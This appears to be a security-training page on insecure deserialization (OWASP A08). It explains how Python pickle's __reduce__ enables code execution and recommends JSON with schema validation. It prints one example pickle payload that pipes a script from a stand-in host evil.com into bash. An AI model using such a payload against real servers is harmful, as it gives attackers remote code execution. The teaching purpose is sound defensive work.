A08: Software or Data Integrity Failures — Insecure Deserialization

Serialization converts an in-memory object into a byte sequence for storage or transmission. Deserialization reverses the process — it reconstructs a live object from bytes. Many native serialization formats (Python pickle, Java ObjectInputStream, PHP unserialize) do not just restore data: they restore object behavior. If the serialized data comes from an untrusted source, an attacker can craft bytes that, when deserialized, execute arbitrary code on the server.

Why Pickle Is Dangerous

Python's pickle format supports a special method __reduce__. When an object is pickled, __reduce__ can return a callable and its arguments. During deserialization, pickle.loads() calls that callable automatically.

A malicious (real-world) pickle payload might encode:

class Exploit:
def __reduce__(self):
return (os.system, ("curl http://evil.com/shell.sh | bash",))

payload = pickle.dumps(Exploit())

When the server calls pickle.loads(payload), it executes os.system("curl http://evil.com/shell.sh | bash") — remote code execution with the web server's privileges.

This demo uses a harmless payload:

class DemoPayload:
def __reduce__(self):
return (harmless_demo_trigger, ())

# harmless_demo_trigger just returns a dict
# No OS calls, no network access

The mechanism is identical to a real exploit — only the payload function differs. In production, an attacker would substitute any callable that runs their code.

1. Serialized Input

The unsafe endpoint calls pickle.loads() on whatever you send. The safe endpoint calls json.loads() — which only restores data, never object behavior.

Why JSON Is Safer

Native serialization (pickle, ObjectInputStream)

  • Restores class instances and their behavior
  • Executes __reduce__, __init__, and lifecycle methods on deserialization
  • Any callable on the server can be invoked by crafting the right bytes
  • Deserialization happens before any validation can run

Data-only formats (JSON, MessagePack, Protocol Buffers)

  • Restores only data: strings, numbers, booleans, lists, objects
  • No code is executed during parsing
  • The application reads values and constructs objects itself — under its own control
  • Schema validation can run on parsed data before it is used

Teaching Point

Wrong

pickle.loads(untrusted_input)

This is equivalent to executing code the attacker sent you.

Better

data = json.loads(input)
obj = MyClass(data["field"]) # you construct it

Use data-only formats. Validate schema after parsing. If you must deserialize native objects, use an allowlist of permitted types.
